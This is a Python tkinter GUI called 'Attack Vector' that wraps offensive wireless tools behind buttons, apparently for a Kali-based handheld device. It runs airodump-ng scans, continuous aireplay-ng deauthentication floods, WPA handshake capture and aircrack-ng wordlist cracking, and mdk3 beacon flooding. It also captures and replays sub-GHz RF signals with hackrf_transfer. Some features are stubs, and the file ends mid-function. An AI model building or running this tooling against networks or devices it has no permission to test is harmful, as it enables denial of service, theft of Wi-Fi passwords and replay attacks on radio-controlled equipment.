import subprocess
import os
import time
import threading 
import signal
import select
import tkinter as tk
import tkinter.font as tkFont
import csv
import queue
from PIL import Image, ImageTk
from tkinter import ttk
from tkinter import messagebox


unified_bg_color = "#282828"
unified_fg_color = "#FFFFFF"


###############################################This is the functions space #####################################


###############################################This is the functions space #####################################

def weight_setup(r, c):
    max_dimension = 12  # Maximum for both rows and columns
    # Set the specified rows and columns to weight 1
    for i in range(max_dimension):
        if i < r:
            content_frame.grid_rowconfigure(i, weight=1)
        else:
            content_frame.grid_rowconfigure(i, weight=0)  # Set all other rows to weight 0
        
        if i < c:
            content_frame.grid_columnconfigure(i, weight=1)
        else:
            content_frame.grid_columnconfigure(i, weight=0)  # Set all other columns to weight 0

def main_page():
    # Page and Font Setup.
    new_frame(content_frame)
    weight_setup(2,3)
    content_frame.grid_rowconfigure(0,weight=0)
    unified_button_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Attack Vector", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

    # Create buttons with specified size and font, and center them in the grid
    wifi_button = tk.Button(content_frame, text="Wi-fi",
                            bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font, command=wifi_page)
    wifi_button.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

    rfid_button = tk.Button(content_frame, text="RFID",
                            bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font, command=rfid_page)
    rfid_button.grid(row=1, column=1, padx=10, pady=10, sticky="nsew")

    sub_ghz_button = tk.Button(content_frame, text="Sub-\nGHz",
                               bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font, command=sub_ghz_page)
    sub_ghz_button.grid(row=1, column=2, padx=10, pady=10, sticky="nsew")

def wifi_page():
    # Page and Font Setup.
    new_frame(content_frame)
    weight_setup(5, 1)
    unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Select Attack", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

    # Create and arrange buttons for different Wi-Fi attack methods
    button_texts = ["Scan Targets", "Beacon Frame Flooding", "Evil Twin"]
    button_commands = [scan_targets, beacon_frame_flooding_page, evil_twin]
    
    for index, (text, command) in enumerate(zip(button_texts, button_commands)):
        button = tk.Button(content_frame, text=text, font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=command)
        button.grid(row=1 + index, column=0, padx=10, pady=10, sticky="nsew")

    # Back button
    return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=main_page)
    return_button.grid(row=4, column=0, padx=10, pady=10, sticky="nsew")
def scan_targets():
    """Displays WLAN interfaces as selectable buttons and navigates to the scanning page."""
    new_frame(content_frame)
    weight_setup(4, 1) 
    unified_button_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Select an Interface", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

    # Get the available WLAN interfaces
    result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, text=True)
    interfaces = [line.split()[0] for line in result.stdout.splitlines() if "IEEE 802.11" in line]

    # Create a button for each WLAN interface
    for index, interface in enumerate(interfaces, start=1):
        interface_button = tk.Button(content_frame, text=interface, font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
                                     command=lambda iface=interface: on_interface_button_click(iface))
        interface_button.grid(row=index, column=0, padx=10, pady=10, sticky="nsew")

    # Remove Last Scan File button
    remove_file_button = tk.Button(content_frame, text="Remove Last Scan File", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda: remove_last_scan_file(remove_file_button))
    remove_file_button.grid(row=len(interfaces) + 1, column=0, padx=10, pady=10, sticky="nsew")

    # Back button
    return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=wifi_page)
    return_button.grid(row=len(interfaces) + 2, column=0, padx=10, pady=10, sticky="nsew")

def remove_last_scan_file(remove_file_button):
    """Removes the last scan file."""
    try:
        subprocess.run(["sudo", "rm", "/tmp/airodump_output-01.csv", "/tmp/handshake_output-01.cap", "/tmp/password.txt"], check=True)
    except:
        pass
    finally:
        remove_file_button.config(text='Removed Successfully')


# Global variable to hold the selected monitor mode interface
monitor_interface = ""

def on_interface_button_click(interface):
    """Handles the selection of a WLAN interface and initiates monitor mode setup."""
    global monitor_interface
    monitor_interface = set_monitor_mode(interface)
    if monitor_interface:
        scanning()

def set_monitor_mode(interface):
    """Set the given WLAN interface into monitor mode and return the new interface name."""
    try:
        # Stop conflicting processes that can interfere with airmon-ng using airmon-ng check kill
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)

        # Place the interface into monitor mode using airmon-ng
        subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)

        # Restart NetworkManager after setting the monitor mode
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=True)

        # Retrieve the new monitor mode interface name
        result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, text=True)
        for line in result.stdout.splitlines():
            if "Mode:Monitor" in line:
                return line.split()[0]
    except subprocess.CalledProcessError as e:
        print(f"Error enabling monitor mode: {e}")
        return None

scanning_process = None
def scanning():
    """Set up the scanning page, start airodump-ng in a thread, and display scanning status."""
    global scanning_process, scanning_output_label

    new_frame(content_frame)
    weight_setup(4, 1)
    unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")

    title_label = tk.Label(content_frame, text="Scanning", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

    scanning_output_label = tk.Label(content_frame, text="Scanning in progress...", bg=unified_bg_color, fg=unified_fg_color, font=tkFont.Font(size=18))
    scanning_output_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

    stop_scanning_button = tk.Button(content_frame, text="Stop Scanning", font=tkFont.Font(size=24), bg=unified_bg_color, fg=unified_fg_color, command=wifi_stop_scanning)
    stop_scanning_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")

    # Start the airodump-ng command in a separate thread to avoid blocking the GUI
    #threading.Thread(target=run_airodump, args=(monitor_interface,), daemon=True).start()
    thread = threading.Thread(target=run_airodump, args=(monitor_interface,))
    thread.start()   

def run_airodump(interface):
    global scanning_process  # Make sure to define this as global to modify it
    command = ['sudo', 'airodump-ng', interface, '-w', '/tmp/airodump_output', '--output-format', 'csv']
    scanning_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

def wifi_stop_scanning():
    global scanning_process  # Make sure to access the global variable
    if scanning_process:
        scanning_process.terminate()  # This sends SIGTERM, you could also send SIGINT if needed
        scanning_process.wait()       # Wait for the process to terminate
        scanning_process = None       # Reset the global variable
    results_page()  # Proceed to results page

def results_page():
    """Read results from the CSV file and display them as buttons in a 4x5 grid."""
    new_frame(content_frame)
    weight_setup(6, 5)  # Adjust grid weights (rows, columns)
    small_button_font = tkFont.Font(family="Helvetica", size=8, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Results", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, columnspan=5, padx=10, pady=10, sticky="nsew")
    
    # Read results using the read_csv_results function
    results = read_csv_results('/tmp/airodump_output-01.csv')
    
    # Limit to 20 entries and create buttons in a 4x5 grid
    for index, (bssid, essid, channel, encryption) in enumerate(results[:20]):
        # Determine row and column positions based on index
        row_position = index // 5 + 1  # Starts at 1 since the title is at row 0
        column_position = index % 5
        
        button_text = f"{essid or 'N/A'} \n({bssid})"
        result_button = tk.Button(content_frame, text=button_text, font=small_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption: choose_attack_page(bssid, essid, channel, encryption))
        result_button.grid(row=row_position, column=column_position, padx=5, pady=5, sticky="nsew")
    
    # Add a back button spanning all columns
    back_button = tk.Button(content_frame, text="Back", font=unified_title_font, bg=unified_bg_color, fg=unified_fg_color, command=wifi_page)
    back_button.grid(row=5, column=0, columnspan=5, padx=10, pady=10, sticky="nsew")


def read_csv_results(file_path):
    # Read the entire file content
    with open(file_path, 'r', encoding='utf-8') as file:
        data = file.read()
    # Split the data into lines and initialize the list for results
    lines = data.splitlines()
    results = []
    # Start reading the lines
    for line in lines:
        # Ignore empty lines and header rows
        if (line == '') or (line.startswith("Station MAC,")) or (line.startswith("BSSID,")):
            continue

        fields = line.split(',')

        if len(fields) >= 13:
            bssid = fields[0].strip()
            channel = fields[3].strip()
            encryption = fields[5].strip()
            essid = fields[13].strip()
            results.append((bssid, essid, channel, encryption))

    return results

def choose_attack_page(bssid, essid, channel, encryption):
    """Display a page to choose an attack type for the given target."""
    new_frame(content_frame)
    weight_setup(4, 1)  # Adjust grid weights
    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")

    # Title label showing the target information
    title_text = f"Choose Attack for {essid or 'N/A'}\n({bssid})\nChannel ({channel})\nEnc ({encryption})"
    title_label = tk.Label(content_frame, text=title_text, bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

    # Deauthentication attack button
    deauth_button = tk.Button(content_frame, text="Deauthentication Attack", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption:  deauth_page(bssid,essid,channel,encryption))
    deauth_button.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

    # Password cracking attack button
    crack_button = tk.Button(content_frame, text="Password Cracking Attack", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption:  password_crack_page(bssid,essid,channel,encryption))
    crack_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")

    # Back button to return to results page
    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=results_page)
    back_button.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")
deauth_process = None
def set_channel(interface, channel):
    """Set the wireless interface to a specific channel."""
    try:
        # Setting the channel using iwconfig
        subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], check=True)
        print(f"Channel set to {channel} on {interface}.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to set channel: {e}")


def deauth_page(bssid, essid, channel, encryption):
    """Display the deauthentication attack page and execute the attack."""
    new_frame(content_frame)
    weight_setup(4, 1)  # Adjust grid weights
    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
    unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Deauthentication Attack", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

    # ESSID and BSSID labels
    essid_label = tk.Label(content_frame, text=f"ESSID: {essid or 'N/A'}\n({bssid})\nChannel ({channel})\nEnc ({encryption})", bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
    essid_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

    # Execute button
    execute_button = tk.Button(content_frame, text="Execute", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
                               command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption: deauth(bssid, essid, channel, encryption, execute_button))
    execute_button.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")

    # Back button to return to the choose_attack_page
    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, 
                            command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption: choose_attack_page(bssid, essid, channel, encryption))
    back_button.grid(row=4, column=0, padx=10, pady=10, sticky="nsew")

    threading.Thread(target=set_channel, args=(monitor_interface, channel)).start()


def deauth(bssid, essid, channel, encryption, execute_button):
    """Conduct the deauthentication attack using aireplay-ng."""
    global deauth_process
    # Update button to show "Stop Execution" and link it to the stop_deauth function
    execute_button.config(text="Stop Execution...", command=lambda: stop_deauth(execute_button))

    # Command to continuously send deauth packets
    command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, monitor_interface]

    # Start the aireplay-ng command as a subprocess
    deauth_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

def stop_deauth(execute_button):
    global deauth_process  # Make sure to access the global variable
    if deauth_process:
        deauth_process.terminate()  # This sends SIGTERM, you could also send SIGINT if needed
        deauth_process.wait()       # Wait for the process to terminate
        deauth_process = None       # Reset the global variable
    # Update the button to show it's stopped and reset the command to start deauth again
    execute_button.config(text="Terminated")


# def test(target_info_label,execute_button):
#     thread = threading.Thread(target=testt, args=(monitor_interface, target_info_label))
#     thread.start()
#     execute_button.config(text='stop', command=lambda: stoop(execute_button))

# def testt(interface, target_info_label):
#     global scanning_process
#     command = ['sudo', 'airodump-ng', interface]
#     scanning_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
#     texts = ''
#     for line in scanning_process.stdout.read():
#         texts += line.decode()
#         target_info_label.config(text=texts)

# def stoop(execute_button):
#     global scanning_process  # Make sure to access the global variable
#     if scanning_process:
#         scanning_process.terminate()  # This sends SIGTERM, you could also send SIGINT if needed
#         scanning_process.wait()       # Wait for the process to terminate
#         scanning_process = None       # Reset the global variable
#     # Update the button to show it's stopped and reset the command to start deauth again
#     execute_button.config(text="Terminated")

crack_deauth = None
crack_airodump = None
crack_aircrack = None
def password_crack_page(bssid, essid, channel, encryption):
    """Display the password cracking attack page."""
    new_frame(content_frame)
    weight_setup(4, 1)
    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
    unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Password Crack Attack", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

    # Target information label
    target_info_label = tk.Label(content_frame, text=f"BSSID: {bssid}\nESSID: {essid or 'N/A'}\nChannel: {channel}\nEncryption: {encryption}",
                                 bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
    target_info_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

    # Execute button
    execute_button = tk.Button(content_frame, text="Execute", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
                               command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption: start_password_cracking(bssid, essid, channel, encryption, execute_button, target_info_label))
    execute_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")

    # Back button
    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda: choose_attack_page(bssid,essid,channel,encryption))
    back_button.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")

    # Set channel
    threading.Thread(target=set_channel, args=(monitor_interface, channel)).start()


def start_password_cracking(bssid, essid, channel, encryption, execute_button, target_info_label):
    """Start the processes for capturing a handshake and initiating a de-auth attack in separate threads."""
    global crack_airodump, crack_deauth
    execute_button.config(text="Deauthing and Listening for Handhsake (Terminate)", command=lambda: stop_password_cracking(bssid, essid, channel, encryption, execute_button, target_info_label))

    def crack_run_airodump():
        # Command to run airodump-ng to capture handshakes
        airodump_command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', '/tmp/handshake_output', '--output-format', 'cap', monitor_interface]
        global crack_airodump
        crack_airodump = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    def crack_run_aireplay():
        # Command to continuously send deauth packets
        aireplay_command = ['sudo', 'aireplay-ng', '-0', '3', '-a', bssid, monitor_interface]
        global crack_deauth
        crack_deauth = subprocess.Popen(aireplay_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Start both processes in separate threads
    threading.Thread(target=crack_run_airodump, daemon=True).start()
    threading.Thread(target=crack_run_aireplay, daemon=True).start()

def stop_password_cracking(bssid, essid, channel, encryption, execute_button, target_info_label):
    """Stop the airodump and aireplay processes."""
    global crack_airodump, crack_deauth, crack_aircrack
    if crack_airodump:
        crack_airodump.terminate()
        crack_airodump.wait()
        crack_airodump = None
    if crack_deauth:
        crack_deauth.terminate()
        crack_deauth.wait()
        crack_deauth = None

    # Reset the button text and functionality to allow re-execution
    execute_button.config(text="Handshake Captured. Crack Password", command=lambda: crack_password(bssid, essid, channel, encryption, execute_button, target_info_label))

def crack_password(bssid, essid, channel, encryption, execute_button, target_info_label):
    """Run aircrack-ng on the captured handshake file."""
    global crack_aircrack
    cap_file = '/tmp/handshake_output-01.cap'  # Assuming default airodump-ng output filename format
    command = ['sudo', 'aircrack-ng', '-b', bssid, '-w', '/home/kali/Wifi/wordlist/rockme.txt', '-l', '/tmp/password.txt', cap_file]

    # Command to continuously send deauth packets
    crack_aircrack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Reset the execute button to start the process again or change to a different task
    execute_button.config(text="Cracking .. (Terminate)", command=lambda: stop_cracking_process(bssid, essid, channel, encryption, execute_button, target_info_label))

def stop_cracking_process(bssid, essid, channel, encryption, execute_button, target_info_label):
    global crack_aircrack
    if crack_aircrack: 
        crack_aircrack.terminate()
        crack_aircrack.wait()
        crack_aircrack = None
    execute_button.config(text="Cracking  stopped. Read contents", command=lambda: read_password(bssid, essid, channel, encryption, execute_button, target_info_label))

def read_password(bssid, essid, channel, encryption, execute_button, target_info_label):
    """
    Reads the contents of a password file and updates the GUI label with the contents.
    """
    try:
        with open("/tmp/password.txt", "r") as file:
            result = file.read()  # Read all contents of the file
        target_info_label.config(text=result)  # Update the label with the contents of the file
        execute_button.config(text="Read Complete")  # Update the button text after reading
    except Exception as e:
        target_info_label.config(text="Failed to read file: " + str(e))  # Show error if read fails
        execute_button.config(text="Read Failed")  # Update the button text to


beacon_process = None

def beacon_frame_flooding_page():
    """Display the page for selecting the beacon frame flooding attack intensity."""
    new_frame(content_frame)
    weight_setup(4, 3)  # Adjust grid weights for 2 rows and 3 columns

    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Select Beacon Attack Intensity", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

    # Generate buttons for each beacon list
    for i in range(6):
        num_beacons = 5 * (i + 1)
        list_path = f"/device/wifi/beaconslist/{num_beacons}_beacons"
        button = tk.Button(content_frame, text=f"{num_beacons} Beacons", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
                           command=lambda lp=list_path, nb=num_beacons: execute_beacon_attack(lp, nb))
        row_idx = i // 3 + 1  # Starts from row 1 because row 0 is the title
        col_idx = i % 3
        button.grid(row=row_idx, column=col_idx, padx=10, pady=10, sticky="nsew")

    # Back button to return to main WiFi page
    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=wifi_page)
    back_button.grid(row=3, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

def execute_beacon_attack(list_path, num_beacons):
    """Display the page for executing the beacon frame flooding attack."""
    new_frame(content_frame)
    weight_setup(4, 1)  # Adjust grid weights for simplicity
    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
    unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Beacon Attack", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

    # Beacon count label
    beacon_count_label = tk.Label(content_frame, text=f"The number of beacons: {num_beacons}", bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
    beacon_count_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

    # Execute button
    execute_button = tk.Button(content_frame, text="Execute", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
                               command=lambda: beacon_attack(list_path, execute_button))
    execute_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")

    # Back button
    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=beacon_frame_flooding_page)
    back_button.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")

def beacon_attack(list_path, execute_button):
    """Execute the beacon frame flooding attack using mdk3 and allow for stopping."""
    global beacon_process
    execute_button.config(text="Stop Executing", command=lambda: stop_beacon_attack(execute_button))

    # Command to continuously send beacon frames
    command = ['sudo', 'mdk3', monitor_interface, 'b', '-a', '-w', '-m', '-s', '100', '-f', list_path]

    # Start the mdk3 command as a subprocess
    beacon_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

def stop_beacon_attack(execute_button):
    global beacon_process
    if beacon_process:
        beacon_process.terminate()  # This sends SIGTERM, you could
        beacon_process.wait()
        beacon_process = None

    execute_button.config(text="Terminated. Go back to beacon page", command=beacon_frame_flooding_page)



def evil_twin():
    print("Setting up Evil Twin...")  # Placeholder for actual function

def rfid_page():
    # Page and Font Setup.
    new_frame(content_frame)
    weight_setup(3, 4)
    unified_button_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Select Operation", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, columnspan=4, padx=10, pady=10, sticky="nsew")

    # Create Read and Write buttons
    read_button = tk.Button(content_frame, text="Read", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=read_card)
    read_button.grid(row=1, column=0, columnspan=2,padx=10, pady=10, sticky="nsew")

    write_button = tk.Button(content_frame, text="Write", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=write_card)
    write_button.grid(row=1, column=2, columnspan=2,padx=10, pady=10, sticky="nsew")

    # Back button
    return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=main_page)
    return_button.grid(row=2, column=0, columnspan=4, padx=10,pady=10, sticky="nsew")

def read_card():
    new_frame(content_frame)

def write_card():
    new_frame(content_frame)

freq_entry = None
capturing_process= None
transmitting_process= None
def sub_ghz_page():
    new_frame(content_frame)
    weight_setup(4, 1)  # Three rows, one column
    global freq_entry
    
    unified_button_font = tkFont.Font(family="Helvetica", size=25, weight="bold")
    
    title_label = tk.Label(content_frame, text="Stubby Subby:", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
    title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
    # Capture button
    capture_button = tk.Button(content_frame, text="Capture", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=capture_sub_ghz)
    capture_button.grid(row=1, column=0, padx=10, pady=10, sticky='nsew')
    
    # Transmit button
    transmit_button = tk.Button(content_frame, text="Transmit", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=transmit_sub_ghz)
    transmit_button.grid(row=2, column=0, padx=10, pady=10, sticky='nsew')
    
    # Back button
    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=main_page)
    back_button.grid(row=3, column=0, padx=10, pady=10, sticky='nsew')

def capture_sub_ghz():
    new_frame(content_frame)
    weight_setup(7, 3)  # Five rows, three columns for the number pad and other controls
    global freq_entry

    
    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=30, weight="bold")
    
    title_label = tk.Label(content_frame, text="Enter Frequency to Capture:", font=unified_title_font, bg=unified_bg_color, fg=unified_fg_color)
    title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

    freq_entry = tk.Entry(content_frame, width=10, font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
    freq_entry.grid(row=0, column=2, pady=10, sticky='nsew')
    freq_entry.config(justify="center")  # Center horizontally


    # Number pad buttons
    number_pad_values = [
        ('1', 0, 0), ('2', 0, 1), ('3', 0, 2),
        ('4', 1, 0), ('5', 1, 1), ('6', 1, 2),
        ('7', 2, 0), ('8', 2, 1), ('9', 2, 2),
        ('0', 3, 1), ('.', 3, 0), ('Clear', 3, 2)
    ]

    for (text, r, c) in number_pad_values:
        command = clear_freq if text == 'Clear' else lambda t=text: add_to_freq(t)
        btn = tk.Button(content_frame, text=text, font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=command)
        btn.grid(row=r + 1, column=c, padx=10, pady=10, sticky='nsew')

    execute_button = tk.Button(content_frame, text="Execute", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
                               command=lambda: capturing_page(freq_entry.get(), execute_button))
    execute_button.grid(row=5, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

    # Back button
    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=sub_ghz_page)
    back_button.grid(row=6, column=0, columnspan=3, padx=10, pady=10, sticky='nsew')

def capturing_page(freq, execute_button):
    new_frame(content_frame)
    weight_setup(4,1)  # Five rows, three columns for the number pad and other controls
    global freq_entry

    
    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=30, weight="bold")
    
    title_label = tk.Label(content_frame, text="Capture an RF Signal", font=unified_title_font, bg=unified_bg_color, fg=unified_fg_color)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
    
    info_label = tk.Label(content_frame, text=f"Listening on {freq}MHz...", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
    info_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

    execute_button = tk.Button(content_frame, text="Stop Capturing. Terminate.", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
                           command=lambda: stop_capturing(execute_button))
    execute_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")

    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda: stop_capturing(back_button))
    back_button.grid(row=3, column=0, padx=10, pady=10, sticky='nsew')

    thread = threading.Thread(target=receive_signal, args=(create_file(freq), int(float(freq) * 1000000), 2000000, 16, 14))
    thread.start()  


def receive_signal(output_file, frequency, sample_rate, if_gain, gain, timeout=None):
    global capturing_process
    command = [
        'hackrf_transfer',
        '-r', output_file,
        '-f', str(frequency),
        '-s', str(sample_rate),
        '-l', str(if_gain),
        '-g', str(gain)
    ]
    try:
        capturing_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception:
        pass

def stop_capturing(execute_button):
    global capturing_process, transmitting_process
    if capturing_process:
        capturing_process.terminate()  # This sends SIGTERM, you could
        capturing_process.wait()
        capturing_process = None
    if transmitting_process:
        transmitting_process.terminate()
        transmitting_process.wait()
        transmitting_process = None

    execute_button.config(text='Stopped. Press to go to back', command=sub_ghz_page)
#check if there is a freq

def transmit_sub_ghz():
    # Page and Font Setup
    new_frame(content_frame)
    weight_setup(5, 3)
    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
    unified_choice_font = tkFont.Font(family="Helvetica", size=10, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")

    # Title label
    title_label = tk.Label(content_frame, text="Select signal", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
    title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

    # List signals from directory and create buttons
    directory = "/device/subghz/signals"
    files = [f for f in os.listdir(directory) if f.endswith('.complex16s')]
    files.sort()

    for index, filename in enumerate(files):
        file_path = os.path.join(directory, filename)
        # Extract frequency from the file name
        freq = filename.split('_')[2].replace('.complex16s', '')

        # Button to transmit signal
        btn = tk.Button(content_frame, text=filename, font=unified_choice_font, bg=unified_bg_color, fg=unified_fg_color,
                        command=lambda fp=file_path, fr=freq, fn=filename: transmitting_page(fp, fr, fn))
        btn.grid(row=1 + index // 3, column=index % 3, padx=5, pady=5, sticky="nsew")

    # Back button
    return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=sub_ghz_page)
    return_button.grid(row=4, column=0, columnspan=3, pady=10, sticky='nsew')

def transmitting_page(fp, fr, fn):
    new_frame(content_frame)
    weight_setup(4,1)  # Five rows, three columns for the number pad and other controls
    global freq_entry

    
    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
    unified_title_font = tkFont.Font(family="Helvetica", size=30, weight="bold")
    
    title_label = tk.Label(content_frame, text="Transmit an RF Signal", font=unified_title_font, bg=unified_bg_color, fg=unified_fg_color)
    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
    
    info_label = tk.Label(content_frame, text=f"Transmitting {fn} on {fr}...", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
    info_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")

